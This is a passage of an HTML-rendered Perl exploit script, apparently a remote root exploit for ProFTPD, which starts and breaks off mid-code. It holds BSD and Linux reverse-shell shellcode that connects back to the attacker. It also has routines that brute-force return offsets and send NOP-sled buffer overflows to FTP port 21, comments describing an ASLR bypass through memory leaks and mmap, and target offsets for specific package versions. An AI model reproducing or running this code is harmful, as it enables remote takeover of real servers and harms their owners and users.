^^</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="variable">$bsdcbsc</code> <code class="plain">=</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments"># setreuid</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments"># connect back :&gt;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x31\xc0\x31\xdb\x53\xb3\x06\x53"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xb3\x01\x53\xb3\x02\x53\x54\xb0"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x61\xcd\x80\x31\xd2\x52\x52\x68"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x41\x41\x41\x41\x66\x68\xb0\xef"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xb7\x02\x66\x53\x89\xe1\xb2\x10"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x52\x51\x50\x52\x89\xc2\x31\xc0"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xb0\x62\xcd\x80\x31\xdb\x39\xc3"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x74\x06\x31\xc0\xb0\x01\xcd\x80"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x31\xc0\x50\x52\x50\xb0\x5a\xcd"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x80\x31\xc0\x31\xdb\x43\x53\x52"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x50\xb0\x5a\xcd\x80\x31\xc0\x43"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x53\x52\x50\xb0\x5a\xcd\x80\x31"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xc0\x50\x68\x2f\x2f\x73\x68\x68"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x2f\x62\x69\x6e\x89\xe3\x50\x54"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x53\x50\xb0\x3b\xcd\x80\x31\xc0"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xb0\x01\xcd\x80"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#linux reverse shell port 45295 by bighawk</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#setup a netcat on this port ^^</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="variable">$lnxcbsc</code> <code class="plain">=</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># setreuid</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># connect back :&gt;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x6a\x66"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x58"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x6a\x01"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x5b"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x31\xc9"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x51"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x6a\x01"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x6a\x02"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x89\xe1"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\xcd\x80"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x68\x7f\x7f\x7f\x7f"</code><code class="plain">. </code><code class="comments"># IP</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x66\x68\xb0\xef"</code><code class="plain">. </code><code class="comments"># PORT</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x66\x6a\x02"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x89\xe1"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x6a\x10"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x51"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x50"</code><code class="plain">.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x89\xe1"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x89\xc6"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x6a\x03"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x5b"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x6a\x66"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x58"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\xcd\x80"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x87\xf3"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x6a\x02"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x59"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\xb0\x3f"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\xcd\x80"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x49"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x79\xf9"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\xb0\x0b"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x31\xd2"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x52"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x68\x2f\x2f\x73\x68"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x68\x2f\x62\x69\x6e"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x89\xe3"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x52"</code><code class="plain">.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\x53"</code><code class="plain">.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="string">"\x89\xe1"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="string">"\xcd\x80"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">sub</code> <code class="plain">exploit1 {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">for</code> <code class="plain">(</code><code class="variable">$counter</code><code class="plain">=</code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][3]; </code><code class="variable">$counter</code> <code class="plain">&lt; </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][4]; </code><code class="variable">$counter</code> <code class="plain">+= 250) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code><code class="plain">(</code><code class="string">"[$target] CURRENT OFFSET = %08x :pP\n"</code><code class="plain">, </code><code class="variable">$counter</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$ret</code> <code class="plain">= </code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$counter</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$align</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][5];</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">my</code> <code class="variable">$sock</code> <code class="plain">= IO::</code><code class="functions">Socket</code><code class="plain">::INET-&gt;new(PeerAddr =&gt; </code><code class="variable">$target</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PeerPort =&gt; 21,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Proto&nbsp;&nbsp;&nbsp; =&gt; </code><code class="string">'tcp'</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$stack</code> <code class="plain">= </code><code class="string">"KCOPERULEZKCOPERULEZKC"</code> <code class="plain">. </code><code class="variable">$ret</code> <code class="plain">. </code><code class="string">"\x90"</code> <code class="plain">x 500 . </code><code class="variable">$shellcode</code> <code class="plain">. </code><code class="string">"A"</code> <code class="plain">x 10;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$v</code> <code class="plain">= &lt;</code><code class="variable">$sock</code><code class="plain">&gt;;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="variable">$sock</code> <code class="string">"\x00"</code> <code class="plain">x </code><code class="variable">$align</code> <code class="plain">. </code><code class="string">"\xff"</code> <code class="plain">. </code><code class="variable">$stack</code> <code class="plain">. </code><code class="string">"\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">close</code><code class="plain">(</code><code class="variable">$sock</code><code class="plain">);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># Linux technique to retrieve a rootshell (C) kingcope 2010</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># only the write(2) plt entry offset is needed for the exploit to work (and of course the</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># align value)</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># once the correct write value is given to the exploit it fetches the memory space of proftpd.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># with this information the exploit can find function entries and byte values</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># relative to the write(2) address.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># once the memory is read out the exploit does the following to circumvent linux adress space</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># randomization:</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># 1.) calculate mmap64() plt entry</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># 2.) seek for assembly instructions in the proftpd memory space relative to write(2)</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#&nbsp;&nbsp;&nbsp;&nbsp; such as pop pop ret instructions</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># 4.) copy known assembly instructions (which have been found before using the memory read)</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments">#&nbsp;&nbsp;&nbsp;&nbsp; to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments">#&nbsp;&nbsp;&nbsp;&nbsp; and make use of the memcpy found before</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># 5.) actually jump to the shellcode finder</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="comments"># 6.) once the shellcode has been copied to 0x10000100 jump to it</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="comments"># 7.) shellcode gets executed and we have our desired root shell.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="keyword">sub</code> <code class="plain">exploit2 {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code><code class="plain">(</code><code class="string">"[$target] %s :pP\n"</code><code class="plain">, </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][0]);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$align</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][4];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$write_offset</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][3];</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$padding</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][5];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">$|=1;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"align = $align\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Seeking for write(2)..\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#known good write(2) values</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#0x0804C290</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#0x0804A85C</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#0x0804A234</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#0x08052830</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#080532D8 proftpd-basic_1.3.3a-4_i386</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#08052938 proftpd-basic_1.3.2e-4_i386 (ubunutu)</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#0804CCD4 psa-proftpd_1.3.2e-debian5.0.build95100504.17_i386 !!</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">printf</code> <code class="string">"Using write offset %08x.\n"</code><code class="plain">, </code><code class="variable">$write_offset</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$k</code> <code class="plain">= </code><code class="variable">$write_offset</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$sock</code> <code class="plain">= IO::</code><code class="functions">Socket</code><code class="plain">::INET-&gt;new(PeerAddr =&gt; </code><code class="variable">$target</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PeerPort =&gt; 21,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Proto&nbsp;&nbsp;&nbsp; =&gt; </code><code class="string">'tcp'</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$sock</code><code class="plain">-&gt;sockopt(SO_LINGER, </code><code class="functions">pack</code><code class="plain">(</code><code class="string">"ii"</code><code class="plain">, 1, 0));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">#$x = &lt;stdin&gt;;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$stack</code> <code class="plain">= </code><code class="string">"KCOPERULEZKCOPERULEZKC"</code><code class="plain">. </code><code class="string">"C"</code> <code class="plain">x </code><code class="variable">$padding</code> <code class="plain">. </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$k</code><code class="plain">).&nbsp; </code><code class="comments"># write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xcc\xcc\xcc\xcc"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">.&nbsp;&nbsp;&nbsp; </code><code class="comments"># fd for write</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code 